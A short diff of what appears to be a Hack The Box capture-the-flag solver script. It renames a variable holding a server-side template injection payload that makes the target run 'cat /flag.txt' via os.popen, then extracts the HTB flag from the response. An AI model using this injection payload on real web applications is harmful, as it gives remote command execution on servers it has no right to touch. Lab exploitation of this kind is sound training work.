@@ -5,8 +5,8 @@ import re
 
 def read_flag(url):
 
-    stock_path="/?text=${self.module.cache.util.os.popen(%27cat%20/flag.txt%27).read()}"
-    response = requests.get(url + stock_path, verify=False)
+    path="/?text=${self.module.cache.util.os.popen(%27cat%20/flag.txt%27).read()}"
+    response = requests.get(url + path, verify=False)
     
     match = re.findall(r"HTB\{.*?\}", response.text)
     if match:
